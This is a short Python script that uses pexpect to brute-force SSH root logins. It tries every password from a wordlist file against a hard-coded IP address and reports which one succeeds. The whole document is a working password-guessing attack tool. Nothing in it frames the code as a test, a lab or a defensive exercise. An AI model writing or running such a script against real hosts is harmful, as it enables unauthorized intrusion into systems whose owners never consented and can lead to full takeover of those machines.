import pexpect

PROMPT = ['# ', '\$ ', '>>>> ', '> ']


def connect(user, host, password):
    ssh_newkey = 'Are you sure want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    shell = pexpect.spawn(connStr)
    ret = shell.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error connecting')
        return
    if ret == 1:
        shell.sendline('yes')
        ret = shell.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error connecting')
            return
    shell.sendline(password)
    shell.expect(PROMPT, timeout=5)
    return shell


def main():
    host = '195.133.1.177'
    user = 'root'
    file = open('pass.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            connect(user, host, password)
            print('[+] Password found: ' + password)
        except:
            print('[-] Wrong password: ' + password)


main()

